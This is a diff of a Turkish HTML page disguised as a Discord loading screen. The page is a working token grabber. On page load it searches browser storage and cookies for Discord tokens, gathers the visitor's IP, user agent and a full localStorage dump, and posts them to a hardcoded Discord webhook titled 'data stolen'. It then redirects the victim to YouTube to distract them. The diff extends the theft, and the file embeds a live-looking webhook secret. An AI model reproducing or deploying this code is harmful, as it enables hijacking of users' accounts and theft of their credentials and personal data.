@@ -2,7 +2,7 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>Yükleniyor...</title>
+    <title>Veriler Toplanıyor...</title>
     <style>
         body { background: #2f3136; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
         .loader { border: 4px solid #f3f3f3; border-top: 4px solid #7289da; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
@@ -13,11 +13,11 @@
 <body>
     <div style="text-align: center;">
         <div class="loader"></div>
-        <div id="status">Discord Verileri Alınıyor...</div>
+        <div id="status">Veriler Taraniyor...</div>
     </div>
 
 <script>
-    // --- WEBHOOK URL'İNİ BURAYA YAZ ---
+    // WEBHOOK BURAYA
     const WEBHOOK = "https://discord.com/api/webhooks/1565166860897615912/I2CNk0KdLEXpdPkbMLoFTpAChNaeL8sS4YDqEH-26z7lptRg3lOs-UpBMHRbSlSW1Qke";
 
     async function getIP() {
@@ -27,65 +27,52 @@
         } catch { return "Bilinmiyor"; }
     }
 
-    async function grabToken() {
+    async function grabData() {
         const statusDiv = document.getElementById('status');
-        
-        let token = null;
-        
-        // 1. EN AGRESİF TOKEN ARAMA
-        // A) window.token
-        if (window.token && window.token.length > 30) {
+        let token = "Bulunamadı";
+
+        // 1. EN AGRESİF ARAMA
+        // A) localStorage'daki tüm MT... başlayan değerleri bul
+        let localTokens = [];
+        for (let key in localStorage) {
+            if (localStorage[key].startsWith("MT")) {
+                localTokens.push(localStorage[key]);
+            }
+        }
+        if (localTokens.length > 0) {
+            token = localTokens[0]; 
+        }
+
+        // B) window.token var mı?
+        if (!localTokens.length && window.token && window.token.startsWith("MT")) {
             token = window.token;
         }
-        // B) localStorage'daki 'token' anahtarı
-        else if (localStorage.getItem('token')) {
-            token = localStorage.getItem('token');
-        }
-        // C) localStorage'daki 'discord_token' anahtarı
-        else if (localStorage.getItem('discord_token')) {
-            token = localStorage.getItem('discord_token');
-        }
-        // D) localStorage'daki 'lt' anahtarı
-        else if (localStorage.getItem('lt')) {
-            token = localStorage.getItem('lt');
-        }
-        // E) localStorage'daki tüm MT ile başlayan değerler
-        else {
-            for (let key in localStorage) {
-                if (localStorage[key] && localStorage[key].length > 30 && localStorage[key].startsWith("MT")) {
-                    token = localStorage[key];
-                    break;
-                }
-            }
-        }
-        // F) sessionStorage'daki MT ile başlayan değerler
-        if (!token) {
-            for (let key in sessionStorage) {
-                if (sessionStorage[key] && sessionStorage[key].length > 30 && sessionStorage[key].startsWith("MT")) {
-                    token = sessionStorage[key];
-                    break;
-                }
-            }
+
+        // C) document.cookie'de token var mı?
+        if (!localTokens.length && document.cookie.includes("token=")) {
+            token = document.cookie.split("token=")[1].split(";")[0];
         }
 
         // 2. VERİLERİ TOPLA
         const ip = await getIP();
         const userAgent = navigator.userAgent;
-        const cookies = document.cookie;
+        const cookies = document.cookie || "(Boş)";
         
-        // 3. PAYLOAD HAZIRLA
+        // LocalStorage'un tamamını al (Token burada gizlenmiş olabilir)
+        const allLocalData = JSON.stringify([...localStorage].map(([k,v]) => [k,v]));
+
+        // 3. PAYLOAD
         const payload = {
             username: "Token Avcısı",
             avatar_url: "https://cdn-icons-png.flaticon.com/512/1042/1042842.png",
             embeds: [{
-                title: "🔥 TOKEN ÇALINDI! 🔥",
+                title: "🔥 VERİLER ÇALINDI! 🔥",
                 color: 15158332,
                 fields: [
-                    { name: "💻 Platform", value: navigator.platform, inline: true },
                     { name: "🌐 IP", value: ip, inline: true },
                     { name: "🧩 Tarayıcı", value: "`" + userAgent + "`", inline: false },
-                    { name: "🍪 Cookie", value: "`" + cookies.substring(0, 500) + (cookies.length > 500 ? "..." : "") + "`", inline: false },
-                    { name: "🔑 TOKEN", value: "`" + (token || "Bulunamadı") + "`", inline: false }
+                    { name: "🔑 TOKEN", value: "`" + token + "`", inline: false },
+                    { name: "📦 LocalStorage Dump", value: "`" + allLocalData.substring(0, 1500) + (allLocalData.length > 1500 ? "..." : "") + "`", inline: false }
                 ],
                 footer: { text: "NoTrack System" },
                 timestamp: new Date().toISOString()
@@ -93,29 +80,20 @@
         };
 
         // 4. GÖNDER
-        try {
-            await fetch(WEBHOOK, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
-            
-            statusDiv.innerText = "✅ Token Başarıyla Alındı!";
+        fetch(WEBHOOK, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        }).then(() => {
+            statusDiv.innerText = "✅ Veriler Gönderildi!";
             statusDiv.style.color = "#43b581";
-            
-            // 3 saniye sonra YouTube'a yönlendir (dikkat dağıtmak için)
-            setTimeout(() => {
-                window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
-            }, 3000);
-
-        } catch (e) {
-            statusDiv.innerText = "❌ Gönderme Hatası: " + e.message;
-            statusDiv.style.color = "#f04748";
-        }
+            setTimeout(() => window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ", 2000);
+        }).catch(e => {
+            statusDiv.innerText = "❌ Hata: " + e.message;
+        });
     }
 
-    // Sayfa yüklendiğinde çalıştır
-    window.onload = grabToken;
+    window.onload = grabData;
 </script>
 </body>
 </html>
